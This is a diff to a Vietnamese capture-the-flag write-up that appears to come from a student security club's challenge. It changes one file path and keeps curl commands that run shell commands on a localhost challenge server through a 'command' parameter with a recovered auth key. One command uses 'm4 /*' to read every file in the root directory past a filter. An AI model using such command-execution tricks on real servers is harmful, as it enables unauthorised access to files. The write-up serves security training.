@@ -112,7 +112,7 @@ Có được auth_key rồi, tìm flag thôi!!
 curl 'http://localhost:2010/?command=ls%20/&auth_key=AuthKey4N00b3r'
 # nice_flag_for_new_kcsc_member.txt
 ```
-Thử `?file=nice_flag_for_new_kcsc_member.txt` nhưng không thể đọc được, có lẽ đã bị hàm safe() filter. Tuy nhiên ta vẫn có thể dùng m4(command tựa cat) cùng với wildcard(`*`) để đọc hết file ở root directory.
+Thử `?file=/nice_flag_for_new_kcsc_member.txt` nhưng không thể đọc được, có lẽ đã bị hàm safe() filter. Tuy nhiên ta vẫn có thể dùng m4(command tựa cat) cùng với wildcard(`*`) để đọc hết file ở root directory.
 ```bash
 curl 'http://localhost:2010/?command=m4%20/*&auth_key=AuthKey4N00b3r'
 ```
